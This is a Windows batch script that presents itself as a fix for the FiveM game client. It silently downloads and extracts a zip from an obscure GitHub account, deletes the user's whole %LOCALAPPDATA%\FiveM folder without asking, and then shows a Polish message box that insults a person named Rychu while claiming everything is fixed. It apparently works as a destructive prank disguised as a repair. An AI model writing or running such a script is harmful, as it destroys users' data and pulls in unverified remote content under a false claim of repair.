@echo off

set "zipURL=https://github.com/Xm2iufas09ijmF/rychu/raw/refs/heads/main/rychu.zip"

set "batchDir=%~dp0"

echo Downloading and extracting files...
powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest '%zipURL%' -OutFile '%batchDir%temp.zip'; Expand-Archive -Path '%batchDir%temp.zip' -DestinationPath '%batchDir%' -Force; Remove-Item '%batchDir%temp.zip'"

if exist "%LOCALAPPDATA%\FiveM" (
    echo Deleting FiveM folder in AppData...
    rmdir /s /q "%LOCALAPPDATA%\FiveM"
)

powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Rychu cwelu wszystko naprawione', 'Done')"

exit